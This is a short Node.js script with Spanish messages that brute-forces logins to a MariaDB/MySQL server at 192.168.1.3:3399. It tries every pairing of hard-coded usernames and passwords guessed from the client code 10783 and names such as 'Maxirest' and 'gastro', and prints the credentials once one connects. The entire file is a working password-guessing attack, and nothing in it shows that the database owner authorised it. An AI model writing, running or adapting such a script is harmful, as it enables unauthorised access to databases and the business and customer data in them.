const { execSync } = require('child_process');

const mysqlPath = 'C:\\Servidor_MariaDB\\bin\\mysql.exe';
const host = '192.168.1.3';
const port = '3399';

const users = [
  'user_10783',
  '10783',
  'root',
  'mx_10783',
  'mx10783',
  'mxt_10783',
  'mxt10783',
  'user_0',
  '0'
];

const passwords = [
  '10783',
  'user_10783',
  'mx_10783',
  'mx10783',
  'mxt_10783',
  'mxt10783',
  '0',
  '010783',
  '107830',
  '1078310783',
  'maxirest10783',
  'Maxirest10783',
  '10783maxirest',
  '10783Maxirest',
  'mr10783',
  'MR10783',
  '10783mr',
  '10783MR',
  'v7.1',
  '7.1',
  '71',
  '73',
  'v71',
  'v73',
  '10783v71',
  '10783v7.1',
  '1078371',
  'gastro10783',
  'Gastro10783',
  '10783gastro',
  '10783Gastro',
  'maxi10783',
  'Maxi10783'
];

console.log(`Probando combinaciones con Codigo de Cliente 10783 en ${host}:${port}...`);

for (const user of users) {
  for (const pwd of passwords) {
    const cmd = `"${mysqlPath}" -h ${host} -P ${port} -u ${user} -p"${pwd}" -e "SELECT 1;"`;
    try {
      execSync(cmd, { encoding: 'utf8', timeout: 2000, stdio: ['pipe', 'pipe', 'pipe'] });
      console.log(`\n🎉🎉🎉 CONEXIÓN EXITOSA! 🎉🎉🎉`);
      console.log(`Usuario: "${user}"`);
      console.log(`Contraseña: "${pwd}"`);
      console.log(`Host: ${host}:${port}`);
      console.log(`Base de datos: mx_10783`);
      process.exit(0);
    } catch (e) {
      // access denied expected
    }
  }
}

console.log('No se pudo autenticar con las variaciones directas de 10783.');
